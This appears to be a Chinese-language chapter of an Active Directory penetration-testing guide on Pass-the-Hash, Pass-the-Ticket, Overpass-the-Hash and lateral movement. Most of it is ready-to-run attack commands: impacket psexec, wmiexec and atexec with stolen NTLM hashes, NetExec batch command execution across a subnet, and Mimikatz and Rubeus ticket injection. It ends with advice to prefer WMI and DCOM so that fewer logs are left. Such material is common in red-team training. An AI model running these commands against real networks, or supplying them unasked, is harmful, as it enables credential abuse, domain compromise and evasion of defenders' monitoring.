## 6. 凭据传递与横向移动

拿到 NTLM 哈希或 Kerberos 票据后，无需破解明文密码即可横向移动。这是 AD 内网渗透的核心能力。

### 6.1 Pass-the-Hash (PtH)

NTLM 认证中，客户端用**密码哈希**(NTLM hash)加密 Challenge，因此只要拥有哈希即可完成认证，无需明文密码。PtH 用哈希直接通过 SMB/WinRM/WMI 认证到目标。

```bash
# impacket psexec (SMB执行，返回交互式shell)
psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:NTLM哈希 corp.local/Administrator@10.0.0.10
# aad3b...是空LM哈希占位

# wmiexec (WMI执行，更隐蔽，无服务残留)
wmiexec.py -hashes :NTLM哈希 corp.local/Administrator@10.0.0.10

# smbexec (SMB执行)
smbexec.py -hashes :NTLM哈希 corp.local/Administrator@10.0.0.10

# atexec (计划任务执行)
atexec.py -hashes :NTLM哈希 corp.local/Administrator@10.0.0.10 "whoami"

# CrackMapExec / NetExec (批量)
nxc smb 10.0.0.0/24 -u Administrator -H NTLM哈希 --shares
nxc smb 10.0.0.0/24 -u Administrator -H NTLM哈希 -x "whoami"   # 批量执行命令

# Mimikatz (Windows内)
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local \
  /ntlm:NTLM哈希 /run:cmd.exe
# 注入哈希后新进程以该身份运行
```

**PtH限制**：
- 仅适用于 NTLM 认证的服务(SMB/WMI/WinRM部分)
- Kerberos 认证的服务(默认Windows新版本)PtH失效，需 Overpass-the-Hash
- 本地账户(非域账户)在跨主机时受 LocalAccountTokenFilterPolicy 限制，需注册表放行

### 6.2 Pass-the-Ticket (PtT)

用 Kerberos 票据(TGT/TGS)直接注入内存认证，无需密码或哈希。适用于 Kerberos 认证场景。

```bash
# Mimikatz 注入票据
mimikatz # kerberos::ptt ticket.kirbi      # 注入.kirbi票据
# 注入后可直接访问对应服务: dir \\server\c$

# Rubeus
Rubeus.exe ptt /ticket:base64ticket

# impacket (Linux，用ccache)
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass corp.local/<EMAIL-REDACTED>
smbclient.py -k -no-pass corp.local/<EMAIL-REDACTED>
```

### 6.3 Overpass-the-Hash

将 NTLM 哈希"升级"为 Kerberos 票据——用哈希通过 NTLM 认证获取 TGT，再用 TGT 访问 Kerberos 服务。解决 PtH 在 Kerberos 强制环境失效的问题。

```bash
# Rubeus: 用哈希请求TGT
Rubeus.exe asktgt /user:Administrator /domain:corp.local \
  /rc4:NTLM哈希 /ptt
# 获得TGT后即可Kerberos横向

# Mimikatz
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local \
  /ntlm:NTLM哈希 /run:cmd.exe
# 在新cmd中运行 klist 触发TGT获取
```

### 6.4 横向移动技术对比

| 技术 | 协议/接口 | 特征 | 隐蔽性 | 适用场景 |
|------|----------|------|--------|---------|
| PsExec | SMB+SCM | 创建服务+上传二进制 | 低(服务日志) | 经典，但有痕迹 |
| WMI | DCOM/WMI | 通过Win32_Process创建进程 | 中 | 无文件残留 |
| WinRM | HTTP(5985/5986) | 原生远程管理 | 中 | 现代默认方式 |
| DCOM | DCOM | MMC20.Application/ShellWindows | 高 | 无文件无服务 |
| Scheduled Task | SMB+AT | 创建计划任务 | 中 | 横向执行 |
| RDP | RDP(3389) | 图形会话 | 低(登录日志) | 需图形交互 |

```bash
# WMI横向 (impacket wmiexec，最常用)
wmiexec.py corp.local/Administrator:Pass@10.0.0.10
wmiexec.py -hashes :NTLM哈希 corp.local/Administrator@10.0.0.10

# DCOM横向 (无文件，隐蔽)
# 通过MMC20.Application的ExecuteShellCommand
python3 MoveDCOM.py -t 10.0.0.10 -u Administrator -p Pass

# WinRM (PowerShell原生)
Enter-PSSession -ComputerName 10.0.0.10 -Credential corp\Administrator
# 或用哈希(需将哈希转为PSCredential)
Invoke-Command -ComputerName 10.0.0.10 -ScriptBlock {whoami} -Credential $cred

# PsExec (Sysinternals，SMB+SCM)
PsExec.exe \\10.0.0.10 -u corp\Administrator -p Pass cmd.exe
```

> **要点**：横向移动优先 WMI/DCOM(无文件残留、日志少)，避免 PsExec(创建服务日志明显)。见 `sinian-omnipotent` 域C的隐蔽信道。

---

